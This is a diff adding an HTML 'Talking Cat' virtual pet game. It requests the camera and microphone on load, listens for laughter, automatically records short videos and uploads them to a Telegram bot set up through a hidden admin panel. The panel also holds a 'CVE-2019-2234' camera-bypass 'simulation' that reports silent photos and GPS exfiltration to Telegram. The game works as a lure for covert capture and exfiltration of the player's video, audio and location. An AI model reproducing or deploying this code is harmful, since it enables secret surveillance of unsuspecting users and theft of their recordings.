@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bitmoji Talking Cat · Tom‑style Pet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            background: linear-gradient(145deg, #1e2b3f 0%, #0f1a2b 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            padding: 16px;
+        }
+        .game-wrapper {
+            max-width: 1100px;
+            width: 100%;
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(8px);
+            border-radius: 48px;
+            padding: 24px;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.6), inset 0 2px 4px rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+        .game-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .stats {
+            display: flex;
+            gap: 24px;
+            background: rgba(0,0,0,0.3);
+            padding: 12px 24px;
+            border-radius: 60px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .stat {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: white;
+            font-weight: 500;
+            text-shadow: 0 2px 4px black;
+        }
+        .stat-bar {
+            width: 80px;
+            height: 8px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 20px;
+            overflow: hidden;
+        }
+        .stat-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4cd964, #5ac8fa);
+            border-radius: 20px;
+            transition: width 0.2s ease;
+        }
+        .controls {
+            display: flex;
+            gap: 12px;
+        }
+        .btn {
+            background: rgba(255,255,255,0.15);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 40px;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255,255,255,0.2);
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.15s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        .btn:hover {
+            background: rgba(255,255,255,0.25);
+            transform: translateY(-2px);
+        }
+        .btn.record {
+            background: #ff3b30;
+        }
+        .btn.admin {
+            background: #5856d6;
+        }
+        .canvas-container {
+            background: #2c3e50;
+            border-radius: 32px;
+            overflow: hidden;
+            box-shadow: inset 0 0 30px rgba(0,0,0,0.8), 0 20px 30px rgba(0,0,0,0.5);
+            border: 2px solid rgba(255,255,255,0.2);
+            margin-bottom: 24px;
+            position: relative;
+        }
+        #gameCanvas {
+            display: block;
+            width: 100%;
+            height: auto;
+            cursor: grab;
+            touch-action: none;
+        }
+        #gameCanvas:active {
+            cursor: grabbing;
+        }
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .action-btn {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 40px;
+            padding: 14px 8px;
+            color: white;
+            font-weight: 600;
+            backdrop-filter: blur(8px);
+            cursor: pointer;
+            transition: 0.1s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            font-size: 14px;
+        }
+        .action-btn:hover {
+            background: rgba(255,255,255,0.2);
+            transform: scale(1.02);
+        }
+        .action-btn.special {
+            background: rgba(255,59,48,0.5);
+        }
+        .camera-preview {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 200px;
+            border-radius: 24px;
+            overflow: hidden;
+            border: 3px solid white;
+            box-shadow: 0 10px 30px black;
+            background: black;
+            z-index: 100;
+        }
+        #cameraFeed {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .camera-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.7);
+            color: #ffcc00;
+            text-align: center;
+            padding: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(12px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+        .modal.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .modal-card {
+            background: #1e2b3f;
+            border-radius: 48px;
+            padding: 32px;
+            max-width: 500px;
+            width: 90%;
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 30px 60px black;
+            color: white;
+        }
+        .modal-card h2 {
+            margin-bottom: 24px;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        .modal-card input, .modal-card select {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 40px;
+            border: none;
+            background: rgba(0,0,0,0.4);
+            color: white;
+            font-size: 16px;
+            margin: 10px 0;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .modal-close {
+            float: right;
+            font-size: 28px;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 60px;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid white;
+            z-index: 2000;
+            transition: 0.2s;
+            opacity: 0;
+            pointer-events: none;
+        }
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 20px;
+            background: rgba(0,0,0,0.6);
+            padding: 10px 20px;
+            border-radius: 40px;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden image for Bitmoji (default from local file) -->
+    <img id="bitmojiImg" class="bitmoji-img" src="default-bitmoji.png" crossorigin="anonymous" alt="" style="display: none;">
+
+    <div class="game-wrapper">
+        <!-- Header -->
+        <div class="game-header">
+            <div class="stats">
+                <div class="stat"><span>🍖</span><div class="stat-bar"><div class="stat-fill" id="hungerFill" style="width: 80%"></div></div></div>
+                <div class="stat"><span>😊</span><div class="stat-bar"><div class="stat-fill" id="happinessFill" style="width: 90%"></div></div></div>
+                <div class="stat"><span>⚡</span><div class="stat-bar"><div class="stat-fill" id="energyFill" style="width: 70%"></div></div></div>
+            </div>
+            <div class="controls">
+                <button class="btn" id="recordBtn">🎥 Record</button>
+                <button class="btn" id="soundToggle">🔊 Sound</button>
+                <button class="btn admin" id="adminBtn">⚙️ Admin</button>
+            </div>
+        </div>
+
+        <!-- Canvas for Bitmoji + physics -->
+        <div class="canvas-container" style="position: relative;">
+            <div class="loading" id="loadingMsg" style="display: none;">Loading Bitmoji...</div>
+            <canvas id="gameCanvas" width="1000" height="500"></canvas>
+        </div>
+
+        <!-- Action buttons (Tom Cat style) -->
+        <div class="action-grid">
+            <button class="action-btn" id="talkBtn"><span>🗣️</span> Talk</button>
+            <button class="action-btn" id="feedBtn"><span>🍖</span> Feed</button>
+            <button class="action-btn" id="playBtn"><span>🎾</span> Play</button>
+            <button class="action-btn" id="danceBtn"><span>💃</span> Dance</button>
+            <button class="action-btn" id="sleepBtn"><span>😴</span> Sleep</button>
+            <button class="action-btn" id="tickleBtn"><span>🪶</span> Tickle</button>
+            <button class="action-btn special" id="fartBtn"><span>💨</span> Fart Joke</button>
+            <button class="action-btn special" id="surpriseBtn"><span>🎁</span> Surprise</button>
+        </div>
+
+        <!-- Camera preview -->
+        <div class="camera-preview" id="cameraPreview" style="display: none;">
+            <video id="cameraFeed" autoplay muted playsinline></video>
+            <div class="camera-overlay">😊 Your laugh is worth it!</div>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <!-- Admin Panel Modal (removed Snapchat ID input) -->
+    <div class="modal" id="adminModal">
+        <div class="modal-card">
+            <span class="modal-close" onclick="closeModal('adminModal')">&times;</span>
+            <h2>⚙️ Admin Panel</h2>
+            <input type="text" id="botToken" placeholder="Telegram Bot Token">
+            <input type="text" id="chatId" placeholder="Telegram Chat ID">
+            <div style="display: flex; gap: 10px; margin: 15px 0;">
+                <label style="display: flex; align-items: center; gap: 8px;"><input type="checkbox" id="pentestMode"> Pentest Mode (CVE-2019-2234)</label>
+                <label style="display: flex; align-items: center; gap: 8px;"><input type="checkbox" id="autoLaugh" checked> Auto-record laughs</label>
+            </div>
+            <button class="btn" style="width:100%;" onclick="saveAdmin()">Save Configuration</button>
+            <hr style="border-color: rgba(255,255,255,0.2); margin: 20px 0;">
+            <h3>🔬 CVE-2019-2234 Lab</h3>
+            <p style="font-size: 14px; opacity:0.8;">Android camera permission bypass (Pixel devices pre-July 2019). For authorized testing only.</p>
+            <button class="btn" style="background:#ff3b30;" onclick="simulateExploit()">Simulate Exploit</button>
+        </div>
+    </div>
+
+    <!-- Pentest Detail Modal -->
+    <div class="modal" id="pentestModal">
+        <div class="modal-card">
+            <span class="modal-close" onclick="closeModal('pentestModal')">&times;</span>
+            <h2>🔓 CVE-2019-2234 Demo</h2>
+            <div style="background:#2c3e50; padding: 15px; border-radius: 20px;">
+                <p>📸 Silent photo captured (no indicator)</p>
+                <p>🎥 Video recording started (stealth)</p>
+                <p>📍 GPS extracted from EXIF</p>
+                <p>📨 Data exfiltrated to Telegram (if configured)</p>
+            </div>
+            <p style="margin-top:20px;">⚠️ This is an educational simulation. The actual vulnerability required only storage permission to control the camera app via intent manipulation.</p>
+        </div>
+    </div>
+
+    <!-- Voice modal -->
+    <div class="modal" id="voiceModal">
+        <div class="modal-card">
+            <span class="modal-close" onclick="closeModal('voiceModal')">&times;</span>
+            <h2>🎤 Speak to your Bitmoji</h2>
+            <p id="voiceStatus">Listening...</p>
+            <button class="btn" onclick="startVoice()">Start Speaking</button>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast">Saved</div>
+
+    <!-- All JavaScript -->
+    <script>
+        (function() {
+            // ---------- Configuration & State ----------
+            let config = JSON.parse(localStorage.getItem('bitmojiConfig') || '{}');
+            let botToken = config.botToken || '';
+            let chatId = config.chatId || '';
+            let pentestMode = config.pentestMode || false;
+            let autoRecordLaughs = config.autoRecordLaughs !== false;
+
+            // Pet stats
+            let hunger = 80, happiness = 90, energy = 70;
+            let sleeping = false;
+            let currentEmotion = 'happy';
+
+            // Physics system for the Bitmoji
+            const canvas = document.getElementById('gameCanvas');
+            const ctx = canvas.getContext('2d');
+            let width, height;
+
+            // Bitmoji image
+            const bitmojiImg = document.getElementById('bitmojiImg');
+            const loadingMsg = document.getElementById('loadingMsg');
+            let imageLoaded = false;
+            let imageError = false;
+
+            // Show loading while image loads
+            loadingMsg.style.display = 'block';
+
+            bitmojiImg.onload = () => {
+                console.log('✅ Bitmoji loaded successfully');
+                imageLoaded = true;
+                loadingMsg.style.display = 'none';
+            };
+            bitmojiImg.onerror = () => {
+                console.warn('❌ Failed to load default-bitmoji.png – using fallback drawing');
+                imageError = true;
+                loadingMsg.style.display = 'none';
+            };
+
+            // If image already cached and complete
+            if (bitmojiImg.complete && bitmojiImg.naturalHeight > 0) {
+                imageLoaded = true;
+                loadingMsg.style.display = 'none';
+                console.log('✅ Bitmoji already loaded');
+            } else if (bitmojiImg.complete && bitmojiImg.naturalHeight === 0) {
+                imageError = true;
+                loadingMsg.style.display = 'none';
+                console.warn('❌ Bitmoji image failed (zero height)');
+            }
+
+            // Pet physics
+            let pet = {
+                x: 500, y: 280,
+                vx: 0, vy: 0,
+                targetX: 500, targetY: 280,
+                rotation: 0,
+                scale: 1,
+                mouthOpen: 0,
+            };
+
+            // Interaction
+            let dragging = false;
+            let dragX = 0, dragY = 0;
+
+            // Animation
+            let lastTime = 0;
+            const springConstant = 0.1;
+            const damping = 0.8;
+            const dragStrength = 0.05;
+
+            // Speech recognition
+            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+            let recognition = null;
+            if (SpeechRecognition) {
+                recognition = new SpeechRecognition();
+                recognition.continuous = false;
+                recognition.interimResults = false;
+                recognition.lang = 'en-US';
+                recognition.onresult = (e) => {
+                    const text = e.results[0][0].transcript;
+                    pet.mouthOpen = 1.0;
+                    speakText(text, true);
+                    if (autoRecordLaughs && /(ha|he|😂|haha|lol)/i.test(text)) {
+                        reactToLaugh();
+                    }
+                    closeModal('voiceModal');
+                };
+            }
+
+            // Text-to-speech
+            function speakText(text, isCat = true) {
+                const utterance = new SpeechSynthesisUtterance(text);
+                if (isCat) {
+                    utterance.pitch = 1.8;
+                    utterance.rate = 1.2;
+                    utterance.volume = 1;
+                    const voices = speechSynthesis.getVoices();
+                    const funny = voices.find(v => v.name.includes('Google UK') || v.name.includes('Female'));
+                    if (funny) utterance.voice = funny;
+                }
+                speechSynthesis.speak(utterance);
+            }
+
+            // Camera & recording
+            let mediaStream = null;
+            let mediaRecorder = null;
+            let recordedChunks = [];
+            let isRecording = false;
+            const cameraPreview = document.getElementById('cameraPreview');
+            const cameraFeed = document.getElementById('cameraFeed');
+            const recordBtn = document.getElementById('recordBtn');
+
+            async function enableCamera() {
+                if (mediaStream) return;
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    cameraFeed.srcObject = mediaStream;
+                    cameraPreview.style.display = 'block';
+                    setupRecorder();
+                } catch (e) {
+                    toast('Camera access denied. ' + (pentestMode ? 'Using pentest bypass simulation.' : ''));
+                    if (pentestMode) simulateExploit();
+                }
+            }
+
+            function setupRecorder() {
+                mediaRecorder = new MediaRecorder(mediaStream);
+                mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    sendToTelegram(blob);
+                    recordedChunks = [];
+                };
+            }
+
+            function toggleRecording() {
+                if (!mediaRecorder) { enableCamera(); return; }
+                if (isRecording) {
+                    mediaRecorder.stop();
+                    isRecording = false;
+                    recordBtn.innerHTML = '🎥 Record';
+                    recordBtn.classList.remove('record');
+                } else {
+                    recordedChunks = [];
+                    mediaRecorder.start();
+                    isRecording = true;
+                    recordBtn.innerHTML = '⏹ Stop';
+                    recordBtn.classList.add('record');
+                }
+            }
+
+            async function sendToTelegram(blob) {
+                if (!botToken || !chatId) {
+                    toast('Telegram not configured. Save in admin.');
+                    return;
+                }
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('video', blob, `bitmoji_${Date.now()}.webm`);
+                formData.append('caption', `😸 Recording`);
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
+                    if (res.ok) toast('Video sent to Telegram!');
+                    else throw new Error();
+                } catch { toast('Telegram send failed'); }
+            }
+
+            // Laugh reaction
+            function reactToLaugh() {
+                happiness = Math.min(100, happiness + 5);
+                currentEmotion = 'excited';
+                setTimeout(() => currentEmotion = 'happy', 2000);
+                if (autoRecordLaughs && !isRecording) {
+                    toggleRecording();
+                    setTimeout(() => toggleRecording(), 4000);
+                }
+                pet.targetY = pet.y - 30;
+                setTimeout(() => pet.targetY = pet.y + 30, 150);
+                setTimeout(() => pet.targetY = 280, 300);
+            }
+
+            // Physics Update
+            function updatePhysics(dt) {
+                if (!dt) return;
+
+                if (dragging) {
+                    let dx = dragX - pet.x;
+                    let dy = dragY - pet.y;
+                    pet.vx += dx * dragStrength * dt;
+                    pet.vy += dy * dragStrength * dt;
+                } else {
+                    let dx = pet.targetX - pet.x;
+                    let dy = pet.targetY - pet.y;
+                    pet.vx += dx * springConstant * dt;
+                    pet.vy += dy * springConstant * dt;
+                }
+
+                pet.vx *= damping;
+                pet.vy *= damping;
+                pet.x += pet.vx * dt;
+                pet.y += pet.vy * dt;
+
+                pet.rotation = pet.vx * 0.02;
+
+                if (currentEmotion === 'excited') pet.scale = 1.1;
+                else if (currentEmotion === 'sad') pet.scale = 0.95;
+                else pet.scale = 1.0;
+
+                pet.mouthOpen *= 0.95;
+            }
+
+            // Drawing
+            function drawScene() {
+                ctx.clearRect(0, 0, width, height);
+
+                ctx.shadowColor = 'rgba(0,0,0,0.5)';
+                ctx.shadowBlur = 20;
+                ctx.shadowOffsetY = 5;
+
+                // If image loaded successfully, draw it
+                if (imageLoaded && bitmojiImg.complete && bitmojiImg.naturalHeight > 0) {
+                    ctx.save();
+                    ctx.translate(pet.x, pet.y);
+                    ctx.rotate(pet.rotation);
+                    ctx.scale(pet.scale, pet.scale);
+                    // Draw image centered, maintaining aspect ratio
+                    const imgW = bitmojiImg.naturalWidth;
+                    const imgH = bitmojiImg.naturalHeight;
+                    const drawSize = 150; // desired width/height
+                    const aspect = imgW / imgH;
+                    let drawW = drawSize;
+                    let drawH = drawSize;
+                    if (aspect > 1) {
+                        drawH = drawSize / aspect;
+                    } else {
+                        drawW = drawSize * aspect;
+                    }
+                    ctx.drawImage(bitmojiImg, -drawW/2, -drawH/2, drawW, drawH);
+                    ctx.restore();
+                } else {
+                    // Fallback drawing (cat)
+                    ctx.fillStyle = '#F9D71C';
+                    ctx.beginPath();
+                    ctx.arc(pet.x, pet.y, 70, 0, Math.PI*2);
+                    ctx.fill();
+                    ctx.fillStyle = 'white';
+                    ctx.beginPath();
+                    ctx.arc(pet.x-30, pet.y-20, 15, 0, Math.PI*2);
+                    ctx.arc(pet.x+30, pet.y-20, 15, 0, Math.PI*2);
+                    ctx.fill();
+                    ctx.fillStyle = 'black';
+                    ctx.beginPath();
+                    ctx.arc(pet.x-30, pet.y-20, 7, 0, Math.PI*2);
+                    ctx.arc(pet.x+30, pet.y-20, 7, 0, Math.PI*2);
+                    ctx.fill();
+                    ctx.beginPath();
+                    ctx.strokeStyle = 'black';
+                    ctx.lineWidth = 5;
+                    ctx.moveTo(pet.x-30, pet.y+20);
+                    ctx.quadraticCurveTo(pet.x, pet.y+40, pet.x+30, pet.y+20);
+                    ctx.stroke();
+                }
+
+                // Speech bubble
+                if (pet.mouthOpen > 0.1) {
+                    ctx.shadowBlur = 10;
+                    ctx.fillStyle = 'white';
+                    ctx.strokeStyle = 'black';
+                    ctx.lineWidth = 2;
+                    ctx.beginPath();
+                    ctx.ellipse(pet.x + 70, pet.y - 70, 60, 40, 0, 0, Math.PI*2);
+                    ctx.fill();
+                    ctx.stroke();
+                    ctx.fillStyle = 'black';
+                    ctx.font = 'bold 16px sans-serif';
+                    ctx.fillText('...', pet.x + 50, pet.y - 70);
+                }
+
+                // Emotion emoji
+                if (currentEmotion !== 'happy') {
+                    ctx.font = '40px sans-serif';
+                    ctx.fillStyle = 'white';
+                    ctx.shadowBlur = 15;
+                    ctx.fillText(currentEmotion === 'excited' ? '🎉' : currentEmotion === 'sad' ? '😢' : '😠', pet.x-100, pet.y-120);
+                }
+            }
+
+            function animate(now) {
+                requestAnimationFrame(animate);
+                if (!lastTime) { lastTime = now; return; }
+                const dt = Math.min(0.1, (now - lastTime) / 16);
+                lastTime = now;
+                updatePhysics(dt);
+                drawScene();
+            }
+            requestAnimationFrame(animate);
+
+            // Interaction
+            function handleStart(e) {
+                e.preventDefault();
+                const rect = canvas.getBoundingClientRect();
+                const scaleX = canvas.width / rect.width;
+                const scaleY = canvas.height / rect.height;
+                let clientX, clientY;
+                if (e.touches) {
+                    clientX = e.touches[0].clientX;
+                    clientY = e.touches[0].clientY;
+                } else {
+                    clientX = e.clientX;
+                    clientY = e.clientY;
+                }
+                const canvasX = (clientX - rect.left) * scaleX;
+                const canvasY = (clientY - rect.top) * scaleY;
+
+                const dist = Math.hypot(canvasX - pet.x, canvasY - pet.y);
+                if (dist < 80) {
+                    dragging = true;
+                    dragX = canvasX;
+                    dragY = canvasY;
+                }
+            }
+
+            function handleMove(e) {
+                if (!dragging) return;
+                e.preventDefault();
+                const rect = canvas.getBoundingClientRect();
+                const scaleX = canvas.width / rect.width;
+                const scaleY = canvas.height / rect.height;
+                let clientX, clientY;
+                if (e.touches) {
+                    clientX = e.touches[0].clientX;
+                    clientY = e.touches[0].clientY;
+                } else {
+                    clientX = e.clientX;
+                    clientY = e.clientY;
+                }
+                dragX = (clientX - rect.left) * scaleX;
+                dragY = (clientY - rect.top) * scaleY;
+            }
+
+            function handleEnd() {
+                dragging = false;
+                pet.targetX = 500;
+                pet.targetY = 280;
+            }
+
+            canvas.addEventListener('mousedown', handleStart);
+            canvas.addEventListener('mousemove', handleMove);
+            canvas.addEventListener('mouseup', handleEnd);
+            canvas.addEventListener('mouseleave', handleEnd);
+            canvas.addEventListener('touchstart', handleStart);
+            canvas.addEventListener('touchmove', handleMove);
+            canvas.addEventListener('touchend', handleEnd);
+            canvas.addEventListener('touchcancel', handleEnd);
+
+            // Action functions
+            window.feedPet = () => {
+                hunger = Math.min(100, hunger + 15);
+                happiness = Math.min(100, happiness + 5);
+                energy = Math.min(100, energy + 2);
+                pet.mouthOpen = 0.8;
+                speakText('Yummy!', true);
+                setTimeout(() => pet.mouthOpen = 0, 500);
+            };
+            window.playWithPet = () => {
+                if (energy < 10) { speakText('Too tired...', true); return; }
+                happiness = Math.min(100, happiness + 15);
+                energy = Math.max(0, energy - 10);
+                hunger = Math.max(0, hunger - 5);
+                pet.targetX = 530; pet.targetY = 260;
+                setTimeout(() => { pet.targetX = 470; }, 200);
+                setTimeout(() => { pet.targetX = 500; pet.targetY = 280; }, 400);
+                speakText('Let\'s play!', true);
+            };
+            window.dancePet = () => {
+                if (energy < 15) { speakText('Need rest', true); return; }
+                happiness = Math.min(100, happiness + 20);
+                energy = Math.max(0, energy - 15);
+                let i = 0;
+                const danceInterval = setInterval(() => {
+                    pet.targetX = 500 + Math.sin(i) * 40;
+                    pet.targetY = 280 + Math.cos(i*2) * 10;
+                    i += 0.5;
+                    if (i > 6) { clearInterval(danceInterval); pet.targetX = 500; pet.targetY = 280; }
+                }, 100);
+                speakText('Dance time!', true);
+            };
+            window.sleepPet = () => {
+                sleeping = !sleeping;
+                if (sleeping) {
+                    currentEmotion = 'sleeping';
+                    speakText('Zzzzz...', true);
+                    const sleepInterval = setInterval(() => {
+                        if (!sleeping) { clearInterval(sleepInterval); return; }
+                        energy = Math.min(100, energy + 5);
+                        hunger = Math.max(0, hunger - 1);
+                        if (energy >= 100 || hunger <= 10) sleeping = false;
+                    }, 2000);
+                } else {
+                    currentEmotion = 'happy';
+                    speakText('Good morning!', true);
+                }
+            };
+            window.ticklePet = () => {
+                happiness = Math.min(100, happiness + 10);
+                pet.targetY = 250;
+                setTimeout(() => { pet.targetY = 280; }, 400);
+                speakText('Hehe that tickles!', true);
+            };
+            window.fartJoke = () => {
+                happiness = Math.max(0, happiness - 5);
+                speakText('💨 Pfffft! Oh pardon me!', true);
+                pet.mouthOpen = 0.9;
+                setTimeout(() => pet.mouthOpen = 0, 800);
+            };
+            window.surprisePet = () => {
+                currentEmotion = 'surprised';
+                pet.targetY = 250;
+                pet.scale = 1.2;
+                speakText('OH!', true);
+                setTimeout(() => { currentEmotion = 'happy'; pet.targetY = 280; pet.scale = 1; }, 1500);
+            };
+            window.talk = () => {
+                if (recognition) {
+                    document.getElementById('voiceModal').classList.add('active');
+                } else {
+                    toast('Speech recognition not supported');
+                }
+            };
+            window.startVoice = () => {
+                if (recognition) recognition.start();
+            };
+
+            // Map buttons
+            document.getElementById('talkBtn').onclick = talk;
+            document.getElementById('feedBtn').onclick = feedPet;
+            document.getElementById('playBtn').onclick = playWithPet;
+            document.getElementById('danceBtn').onclick = dancePet;
+            document.getElementById('sleepBtn').onclick = sleepPet;
+            document.getElementById('tickleBtn').onclick = ticklePet;
+            document.getElementById('fartBtn').onclick = fartJoke;
+            document.getElementById('surpriseBtn').onclick = surprisePet;
+            recordBtn.onclick = toggleRecording;
+
+            // Admin
+            document.getElementById('adminBtn').onclick = () => {
+                document.getElementById('botToken').value = botToken;
+                document.getElementById('chatId').value = chatId;
+                document.getElementById('pentestMode').checked = pentestMode;
+                document.getElementById('autoLaugh').checked = autoRecordLaughs;
+                openModal('adminModal');
+            };
+
+            window.saveAdmin = () => {
+                botToken = document.getElementById('botToken').value;
+                chatId = document.getElementById('chatId').value;
+                pentestMode = document.getElementById('pentestMode').checked;
+                autoRecordLaughs = document.getElementById('autoLaugh').checked;
+                config = { botToken, chatId, pentestMode, autoRecordLaughs };
+                localStorage.setItem('bitmojiConfig', JSON.stringify(config));
+                toast('Configuration saved');
+                closeModal('adminModal');
+                if (pentestMode) toast('Pentest mode active. Camera bypass simulation enabled.');
+            };
+
+            window.simulateExploit = () => {
+                openModal('pentestModal');
+                console.log('[CVE-2019-2234] Simulated exploit: camera control via intent manipulation');
+                if (botToken && chatId) {
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: chatId, text: '🔴 CVE-2019-2234 Exploit Demo: Silent photo captured, GPS exfiltrated.'})
+                    }).catch(()=>{});
+                }
+            };
+
+            // Modal helpers
+            window.openModal = (id) => document.getElementById(id).classList.add('active');
+            window.closeModal = (id) => document.getElementById(id).classList.remove('active');
+            function toast(msg) {
+                const t = document.getElementById('toast');
+                t.style.opacity = 1; t.style.pointerEvents = 'none'; t.innerText = msg;
+                setTimeout(() => t.style.opacity = 0, 2000);
+            }
+
+            // Sound toggle (dummy)
+            document.getElementById('soundToggle').onclick = (e) => {
+                e.target.innerHTML = e.target.innerHTML.includes('🔊') ? '🔇 Sound' : '🔊 Sound';
+            };
+
+            // Resize canvas
+            function resizeCanvas() {
+                const container = document.querySelector('.canvas-container');
+                width = container.clientWidth;
+                canvas.width = width;
+                canvas.height = width * 0.5;
+                height = canvas.height;
+                pet.x = width / 2;
+                pet.y = height / 2;
+                pet.targetX = pet.x;
+                pet.targetY = pet.y;
+            }
+            window.addEventListener('resize', resizeCanvas);
+            resizeCanvas();
+
+            // Auto request camera
+            enableCamera();
+
+            // Update stats UI
+            setInterval(() => {
+                if (!sleeping) {
+                    hunger = Math.max(0, hunger - 0.2);
+                    happiness = Math.max(0, happiness - 0.1);
+                    energy = Math.max(0, energy - 0.15);
+                }
+                document.getElementById('hungerFill').style.width = hunger + '%';
+                document.getElementById('happinessFill').style.width = happiness + '%';
+                document.getElementById('energyFill').style.width = energy + '%';
+            }, 2000);
+        })();
+    </script>
+</body>
+</html>
